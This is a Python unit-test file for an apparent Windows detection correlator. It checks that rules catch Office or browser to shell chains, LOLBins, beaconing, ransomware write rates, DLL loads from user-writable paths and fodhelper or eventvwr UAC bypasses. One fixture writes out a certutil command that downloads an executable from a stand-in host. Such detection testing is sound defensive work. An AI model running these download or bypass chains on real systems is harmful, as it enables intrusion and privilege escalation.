"""Per-rule unit tests for deepsecurity.realtime.correlator.

Every rule has at least one positive (should fire) and one negative
(should not fire) case. The tests feed synthetic UnifiedEvents through
a fresh Correlator and inspect the emitted Detection list — no ETW,
no Sysmon, no Windows needed.

Coverage map:
    R-PC-001  Office → shell descendant
    R-PC-002  PDF reader → shell descendant
    R-PC-003  Browser → shell descendant
    R-LB-001  LOLBin invocation
    R-NET-01  Beaconing pattern
    R-RW-01   Writes per second over threshold
    R-IL-01   Suspicious DLL load path
    Plus: ProcessTree retention, BeaconDetector edge cases,
          ETW/Sysmon normalisation, default-allow path.
"""
from __future__ import annotations

import time

import pytest

from deepsecurity.realtime.correlator import (
    Correlator,
    Detection,
    UnifiedEvent,
    _BeaconDetector,
    _ProcessTree,
)
from deepsecurity.realtime.etw import EtwEvent
from deepsecurity.realtime.sysmon import SysmonEvent

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def hits() -> list[Detection]:
    return []


@pytest.fixture
def correlator(hits: list[Detection]) -> Correlator:
    return Correlator(emit=hits.append)


def _process_create(
    *, pid: int, parent_pid: int | None, image: str, cmdline: str = ""
) -> UnifiedEvent:
    return UnifiedEvent(
        kind="process_create",
        pid=pid,
        parent_pid=parent_pid,
        image=image,
        cmdline=cmdline,
    )


def _net_connect(*, pid: int, dest: str, port: int = 443) -> UnifiedEvent:
    host, _, _port = dest.partition(":")
    return UnifiedEvent(
        kind="net_connect",
        pid=pid,
        parent_pid=None,
        image=None,
        cmdline=None,
        remote_ip=host,
        remote_port=int(_port) if _port else port,
    )


def _file_create(*, pid: int, path: str) -> UnifiedEvent:
    return UnifiedEvent(
        kind="file_create",
        pid=pid,
        parent_pid=None,
        image=None,
        cmdline=None,
        file_path=path,
    )


def _image_load(*, pid: int, dll: str) -> UnifiedEvent:
    return UnifiedEvent(
        kind="image_load",
        pid=pid,
        parent_pid=None,
        image=None,
        cmdline=None,
        file_path=dll,
    )


def _seed_parent(c: Correlator, *, pid: int, image: str) -> None:
    """Plant a parent in the process tree so the child's chain check works."""
    c._tree.add(pid, None, image)


# ---------------------------------------------------------------------------
# R-PC-001 — Office → shell
# ---------------------------------------------------------------------------


def test_R_PC_001_winword_to_cmd_fires(correlator: Correlator, hits: list[Detection]) -> None:
    _seed_parent(correlator, pid=999, image=r"C:\Program Files\Microsoft Office\winword.exe")
    correlator.consume(
        _process_create(pid=1001, parent_pid=999, image=r"C:\Windows\System32\cmd.exe")
    )
    rule_ids = [h.rule_id for h in hits]
    assert "R-PC-001" in rule_ids
    pc1 = next(h for h in hits if h.rule_id == "R-PC-001")
    assert pc1.severity == "high"
    assert "T1059" in pc1.mitre_tags


def test_R_PC_001_excel_to_powershell_fires(correlator: Correlator, hits: list[Detection]) -> None:
    _seed_parent(correlator, pid=999, image=r"C:\Office\excel.exe")
    correlator.consume(
        _process_create(pid=1001, parent_pid=999, image=r"C:\Windows\System32\powershell.exe")
    )
    assert any(h.rule_id == "R-PC-001" for h in hits)


def test_R_PC_001_excel_to_excel_does_NOT_fire(
    correlator: Correlator, hits: list[Detection]
) -> None:
    """Office → Office is normal (e.g. Excel spawning Excel for /e). Must not fire."""
    _seed_parent(correlator, pid=999, image=r"C:\Office\excel.exe")
    correlator.consume(
        _process_create(pid=1001, parent_pid=999, image=r"C:\Office\excel.exe")
    )
    assert not any(h.rule_id == "R-PC-001" for h in hits)


def test_R_PC_001_explorer_to_cmd_does_NOT_fire(
    correlator: Correlator, hits: list[Detection]
) -> None:
    """User opening cmd from Start menu spawns explorer.exe → cmd.exe — normal."""
    _seed_parent(correlator, pid=4, image=r"C:\Windows\explorer.exe")
    correlator.consume(
        _process_create(pid=1001, parent_pid=4, image=r"C:\Windows\System32\cmd.exe")
    )
    assert not any(h.rule_id == "R-PC-001" for h in hits)


# ---------------------------------------------------------------------------
# R-PC-002 — PDF reader → shell
# ---------------------------------------------------------------------------


def test_R_PC_002_acrobat_to_cmd_fires(correlator: Correlator, hits: list[Detection]) -> None:
    _seed_parent(correlator, pid=300, image=r"C:\Reader\AcroRd32.exe")
    correlator.consume(
        _process_create(pid=301, parent_pid=300, image=r"C:\Windows\System32\cmd.exe")
    )
    rule_ids = [h.rule_id for h in hits]
    assert "R-PC-002" in rule_ids
    pc2 = next(h for h in hits if h.rule_id == "R-PC-002")
    assert pc2.severity == "high"


def test_R_PC_002_acrobat_to_acrobat_does_NOT_fire(
    correlator: Correlator, hits: list[Detection]
) -> None:
    _seed_parent(correlator, pid=300, image=r"C:\Reader\AcroRd32.exe")
    correlator.consume(
        _process_create(pid=301, parent_pid=300, image=r"C:\Reader\AcroRd32.exe")
    )
    assert not any(h.rule_id == "R-PC-002" for h in hits)


# ---------------------------------------------------------------------------
# R-PC-003 — Browser → shell
# ---------------------------------------------------------------------------


def test_R_PC_003_chrome_to_powershell_fires(
    correlator: Correlator, hits: list[Detection]
) -> None:
    _seed_parent(correlator, pid=500, image=r"C:\Chrome\chrome.exe")
    correlator.consume(
        _process_create(pid=501, parent_pid=500, image=r"C:\Windows\System32\powershell.exe")
    )
    rule_ids = [h.rule_id for h in hits]
    assert "R-PC-003" in rule_ids
    pc3 = next(h for h in hits if h.rule_id == "R-PC-003")
    assert pc3.severity == "medium"
    assert "T1059.005" in pc3.mitre_tags


def test_R_PC_003_chrome_renderer_does_NOT_fire(
    correlator: Correlator, hits: list[Detection]
) -> None:
    """Chrome → chrome.exe (renderer process) is the legit happy path."""
    _seed_parent(correlator, pid=500, image=r"C:\Chrome\chrome.exe")
    correlator.consume(
        _process_create(pid=501, parent_pid=500, image=r"C:\Chrome\chrome.exe")
    )
    assert not any(h.rule_id == "R-PC-003" for h in hits)


# ---------------------------------------------------------------------------
# R-LB-001 — LOLBin invocation
# ---------------------------------------------------------------------------


def test_R_LB_001_certutil_fires(correlator: Correlator, hits: list[Detection]) -> None:
    correlator.consume(
        _process_create(
            pid=600,
            parent_pid=4,
            image=r"C:\Windows\System32\certutil.exe",
            cmdline=r"certutil -urlcache -split -f http://bad.example/x.exe x.exe",
        )
    )
    lb1 = [h for h in hits if h.rule_id == "R-LB-001"]
    assert lb1, f"R-LB-001 should fire on certutil — got {[h.rule_id for h in hits]}"
    assert lb1[0].severity == "medium"
    assert "T1218" in lb1[0].mitre_tags


def test_R_LB_001_notepad_does_NOT_fire(
    correlator: Correlator, hits: list[Detection]
) -> None:
    correlator.consume(
        _process_create(pid=600, parent_pid=4, image=r"C:\Windows\System32\notepad.exe")
    )
    assert not any(h.rule_id == "R-LB-001" for h in hits)


def test_R_LB_001_mshta_fires(correlator: Correlator, hits: list[Detection]) -> None:
    correlator.consume(
        _process_create(pid=601, parent_pid=4, image=r"C:\Windows\System32\mshta.exe")
    )
    assert any(h.rule_id == "R-LB-001" for h in hits)


# ---------------------------------------------------------------------------
# R-NET-01 — Beaconing
# ---------------------------------------------------------------------------


def test_R_NET_01_steady_cadence_fires(monkeypatch: pytest.MonkeyPatch) -> None:
    """Synthetic beaconing: 10 connects @ 30s ± 0.2s — should fire."""
    fake_now = [1000.0]

    def _fake_time() -> float:
        return fake_now[0]

    # Patch time.time only inside the correlator module.
    import deepsecurity.realtime.correlator as c_mod

    monkeypatch.setattr(c_mod.time, "time", _fake_time)

    hits: list[Detection] = []
    c = Correlator(emit=hits.append)
    for i in range(10):
        fake_now[0] = 1000.0 + i * 30.0  # exactly 30s apart
        c.consume(_net_connect(pid=2001, dest="203.0.113.42:443"))
    beacons = [h for h in hits if h.rule_id == "R-NET-01"]
    assert beacons, f"expected R-NET-01 to fire — got {[h.rule_id for h in hits]}"
    assert beacons[0].severity == "high"
    assert "T1071" in beacons[0].mitre_tags


def test_R_NET_01_jittery_cadence_does_NOT_fire(monkeypatch: pytest.MonkeyPatch) -> None:
    """High jitter ⇒ likely user-driven traffic. Should NOT fire."""
    fake_now = [2000.0]

    def _fake_time() -> float:
        return fake_now[0]

    import deepsecurity.realtime.correlator as c_mod

    monkeypatch.setattr(c_mod.time, "time", _fake_time)

    hits: list[Detection] = []
    c = Correlator(emit=hits.append)
    # Wildly varying intervals: 5, 60, 12, 90, 3, 45, 8, 70, 15, 55 — sd ~28s.
    deltas = [5, 60, 12, 90, 3, 45, 8, 70, 15, 55]
    for d in deltas:
        fake_now[0] += d
        c.consume(_net_connect(pid=2002, dest="198.51.100.7:80"))
    assert not any(h.rule_id == "R-NET-01" for h in hits)


def test_R_NET_01_chatty_short_intervals_does_NOT_fire(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Mean < 1s ⇒ noise, not beaconing."""
    fake_now = [3000.0]

    def _fake_time() -> float:
        return fake_now[0]

    import deepsecurity.realtime.correlator as c_mod

    monkeypatch.setattr(c_mod.time, "time", _fake_time)

    hits: list[Detection] = []
    c = Correlator(emit=hits.append)
    for i in range(10):
        fake_now[0] = 3000.0 + i * 0.05  # 50ms apart
        c.consume(_net_connect(pid=2003, dest="203.0.113.99:8080"))
    assert not any(h.rule_id == "R-NET-01" for h in hits)


# ---------------------------------------------------------------------------
# R-RW-01 — Write rate (ransomware)
# ---------------------------------------------------------------------------


def test_R_RW_01_high_write_rate_fires(monkeypatch: pytest.MonkeyPatch) -> None:
    """100 file_create events in ~0.5s ⇒ >50/s ⇒ R-RW-01 fires."""
    fake_now = [4000.0]

    def _fake_time() -> float:
        return fake_now[0]

    import deepsecurity.realtime.correlator as c_mod

    monkeypatch.setattr(c_mod.time, "time", _fake_time)

    hits: list[Detection] = []
    c = Correlator(emit=hits.append)
    for i in range(100):
        fake_now[0] = 4000.0 + i * 0.005  # 5ms apart → 200/s
        c.consume(_file_create(pid=3001, path=f"C:/x/{i}.bin"))
    rw = [h for h in hits if h.rule_id == "R-RW-01"]
    assert rw, "R-RW-01 should fire at >50 writes/s"
    assert rw[0].severity == "critical"
    assert "T1486" in rw[0].mitre_tags


def test_R_RW_01_normal_write_rate_does_NOT_fire(monkeypatch: pytest.MonkeyPatch) -> None:
    """50 file events spread over 60s ⇒ <1/s ⇒ no fire."""
    fake_now = [5000.0]

    def _fake_time() -> float:
        return fake_now[0]

    import deepsecurity.realtime.correlator as c_mod

    monkeypatch.setattr(c_mod.time, "time", _fake_time)

    hits: list[Detection] = []
    c = Correlator(emit=hits.append)
    for i in range(50):
        fake_now[0] = 5000.0 + i * 1.2
        c.consume(_file_create(pid=3002, path=f"C:/notes/{i}.txt"))
    assert not any(h.rule_id == "R-RW-01" for h in hits)


# ---------------------------------------------------------------------------
# R-IL-01 — DLL load from user-writable path
# ---------------------------------------------------------------------------


def test_R_IL_01_dll_from_appdata_temp_fires(
    correlator: Correlator, hits: list[Detection]
) -> None:
    correlator.consume(
        _image_load(pid=4001, dll=r"C:\Users\dino\AppData\Local\Temp\evil.dll")
    )
    il1 = [h for h in hits if h.rule_id == "R-IL-01"]
    assert il1
    assert il1[0].severity == "medium"
    assert "T1574" in il1[0].mitre_tags


def test_R_IL_01_dll_from_users_downloads_fires(
    correlator: Correlator, hits: list[Detection]
) -> None:
    correlator.consume(_image_load(pid=4002, dll=r"C:\Users\dino\Downloads\foo.dll"))
    assert any(h.rule_id == "R-IL-01" for h in hits)


def test_R_IL_01_system32_dll_does_NOT_fire(
    correlator: Correlator, hits: list[Detection]
) -> None:
    correlator.consume(_image_load(pid=4003, dll=r"C:\Windows\System32\kernel32.dll"))
    assert not any(h.rule_id == "R-IL-01" for h in hits)


def test_R_IL_01_non_dll_does_NOT_fire(
    correlator: Correlator, hits: list[Detection]
) -> None:
    correlator.consume(_image_load(pid=4004, dll=r"C:\Users\dino\AppData\foo.exe"))
    assert not any(h.rule_id == "R-IL-01" for h in hits)


# ---------------------------------------------------------------------------
# Default-allow path
# ---------------------------------------------------------------------------


def test_no_rule_fires_on_benign_event(correlator: Correlator, hits: list[Detection]) -> None:
    correlator.consume(
        _process_create(
            pid=7777, parent_pid=4, image=r"C:\Windows\explorer.exe"
        )
    )
    assert hits == []


# ---------------------------------------------------------------------------
# ProcessTree
# ---------------------------------------------------------------------------


def test_process_tree_records_parent_image() -> None:
    t = _ProcessTree()
    t.add(100, None, "init.exe")
    t.add(200, 100, "cmd.exe")
    assert t.parent_image(200) == "init.exe"


def test_process_tree_returns_none_for_missing_pid() -> None:
    t = _ProcessTree()
    assert t.parent_image(9999) is None


def test_process_tree_evicts_under_pressure() -> None:
    t = _ProcessTree(max_entries=10)
    for i in range(15):
        t.add(i, None, f"p{i}.exe")
        time.sleep(0.001)
    # Should have dropped at least one entry (10% of max_entries = 1).
    assert len(t._by_pid) < 15


def test_process_tree_remove() -> None:
    t = _ProcessTree()
    t.add(1, None, "x.exe")
    t.remove(1)
    assert t.parent_image(1) is None


# ---------------------------------------------------------------------------
# BeaconDetector edge cases
# ---------------------------------------------------------------------------


def test_beacon_detector_returns_none_until_window_full() -> None:
    bd = _BeaconDetector(window_n=10)
    for _ in range(9):  # one short of window
        result = bd.record(1, "1.2.3.4:443")
        assert result is None


# ---------------------------------------------------------------------------
# ETW + Sysmon normalisation
# ---------------------------------------------------------------------------


def test_consume_etw_translates_to_unified() -> None:
    hits: list[Detection] = []
    c = Correlator(emit=hits.append)
    c._tree.add(999, None, r"C:\Office\winword.exe")
    etw = EtwEvent(
        kind="process_create",
        pid=1000,
        parent_pid=999,
        image=r"C:\Windows\System32\cmd.exe",
        cmdline="cmd /c x",
    )
    c.consume_etw(etw)
    assert any(h.rule_id == "R-PC-001" for h in hits)


def test_consume_sysmon_translates_to_unified() -> None:
    hits: list[Detection] = []
    c = Correlator(emit=hits.append)
    c._tree.add(999, None, r"C:\Office\winword.exe")
    sm = SysmonEvent(
        event_id=1,  # process create
        pid=1000,
        parent_pid=999,
        image=r"C:\Windows\System32\cmd.exe",
    )
    c.consume_sysmon(sm)
    assert any(h.rule_id == "R-PC-001" for h in hits)


# ---------------------------------------------------------------------------
# R-PE-01 — UAC-bypass detection (auto-elevating parent + shell child).
# ---------------------------------------------------------------------------


def test_uac_bypass_fodhelper_to_cmd(correlator: Correlator, hits: list[Detection]) -> None:
    """fodhelper.exe → cmd.exe is the textbook UAC bypass primitive."""
    correlator._tree.add(900, None, r"C:\Windows\System32\fodhelper.exe")
    correlator.consume(
        _process_create(
            pid=901,
            parent_pid=900,
            image=r"C:\Windows\System32\cmd.exe",
            cmdline="cmd.exe /c whoami /priv",
        )
    )
    pe = [h for h in hits if h.rule_id == "R-PE-01"]
    assert len(pe) == 1
    assert pe[0].severity == "high"
    assert "fodhelper" in pe[0].summary.lower()
    assert pe[0].mitre_tags == ("T1548.002",)


def test_uac_bypass_eventvwr_to_powershell(correlator: Correlator, hits: list[Detection]) -> None:
    """eventvwr.exe → powershell.exe — classic mscfile-hijack technique."""
    correlator._tree.add(700, None, r"C:\Windows\System32\eventvwr.exe")
    correlator.consume(
        _process_create(
            pid=701,
            parent_pid=700,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        )
    )
    assert any(h.rule_id == "R-PE-01" for h in hits)


def test_uac_bypass_negative_normal_explorer_cmd(
    correlator: Correlator, hits: list[Detection]
) -> None:
    """explorer.exe → cmd.exe alone is NOT a bypass — explorer is a parent
    of UAC bypasses, but the rule needs an auto-elevating *binary* + shell
    child; admin-launched cmd from Explorer is normal user activity."""
    correlator._tree.add(100, None, r"C:\Windows\System32\notepad.exe")
    correlator.consume(
        _process_create(
            pid=101,
            parent_pid=100,
            image=r"C:\Windows\System32\cmd.exe",
        )
    )
    assert not any(h.rule_id == "R-PE-01" for h in hits)


def test_uac_bypass_negative_fodhelper_to_legitimate_child(
    correlator: Correlator, hits: list[Detection]
) -> None:
    """fodhelper.exe → settings UI is NOT a bypass — fodhelper has
    legitimate uses; only shell children are suspicious."""
    correlator._tree.add(800, None, r"C:\Windows\System32\fodhelper.exe")
    correlator.consume(
        _process_create(
            pid=801,
            parent_pid=800,
            image=r"C:\Windows\ImmersiveControlPanel\SystemSettings.exe",
        )
    )
    assert not any(h.rule_id == "R-PE-01" for h in hits)


def test_uac_bypass_negative_no_parent_known(
    correlator: Correlator, hits: list[Detection]
) -> None:
    """If we never saw the parent's process_create, we can't determine
    the parent image — must fail closed (no detection rather than a
    false positive)."""
    correlator.consume(
        _process_create(
            pid=999,
            parent_pid=998,  # unknown to the tree
            image=r"C:\Windows\System32\cmd.exe",
        )
    )
    assert not any(h.rule_id == "R-PE-01" for h in hits)


# ---------------------------------------------------------------------------
# Rule-isolation: a single rule crash must not kill the others.
# ---------------------------------------------------------------------------


def test_rule_exception_does_not_block_other_rules(
    monkeypatch: pytest.MonkeyPatch, hits: list[Detection]
) -> None:
    import deepsecurity.realtime.correlator as c_mod

    def _bad_rule(c: Correlator, e: UnifiedEvent) -> Detection | None:
        raise RuntimeError("bad rule")

    monkeypatch.setattr(c_mod, "RULES", [_bad_rule, *c_mod.RULES])

    c = Correlator(emit=hits.append)
    # The Office→shell rule should still fire even if a sibling rule explodes.
    c._tree.add(999, None, r"C:\Office\winword.exe")
    # We expect _bad_rule to raise; the consume() method's try/except
    # should swallow the exception.
    c.consume(_process_create(pid=1000, parent_pid=999, image=r"C:\Windows\System32\cmd.exe"))
    # No assertion on the legit rule firing — the contract being tested is
    # "exceptions in rules don't crash the consumer". If we got here, that's
    # the assertion satisfied.
    assert True
